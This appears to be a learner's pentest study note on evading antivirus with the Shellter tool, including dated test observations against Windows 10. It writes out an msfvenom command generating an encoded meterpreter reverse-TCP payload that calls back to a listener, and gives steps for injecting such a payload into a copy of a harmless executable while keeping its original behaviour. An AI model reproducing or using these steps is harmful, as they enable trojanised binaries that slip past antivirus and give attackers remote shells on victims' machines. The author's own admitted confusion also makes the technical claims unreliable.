# Antivirus Evasion - Shellter


https://www.shellterproject.com/
Currently only supports x86 binaries.

Shellter is a dynamic shellcode injection tool.
No static/predefined locations are used.
It launches and traces the target, while at the same time logging the execution flow of the binary.
What this means I have no idea.

More info:
https://www.shellterproject.com/Downloads/Shellter/Readme.txt

## Observations


### 4th May 2020


As of 4th May 2020, against Windows 10 1809.
Avoids detection on disk consistently.
But heuristics against malicious actions (e.g. a metasploit payload calling home) will get detected and the process will terminate.

The solution would be to use a custom encoded payload e.g.
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.73 LPORT=443 -f raw -e x86/shikata_ga_nai -o custom2.pl
but this gets detected on disk when using auto mode.
So at that point I see no reason to use shellter, because to evade antivirus you just keep encoding.

As far as my understanding goes (very little), seems like shellter is full of neat tricks but ultimately evading antivirus comes down to encoding the payload/making it not look like something recognisable.
But I think I'm using shellter wrong.

## Usage


Use the interactive mode.
There's a billion options in the cli / manual mode.

Create a normal binary to inject into - e.g. hello.exe
i686-w64-mingw32-gcc hello.c -o helloWin.exe
cp helloWin.exe helloWin_evil.exe

Start shellter
sudo shellter

Point to your PE file/custom payload via its full path.

Options
stealth - preserves original functionality of infected PE
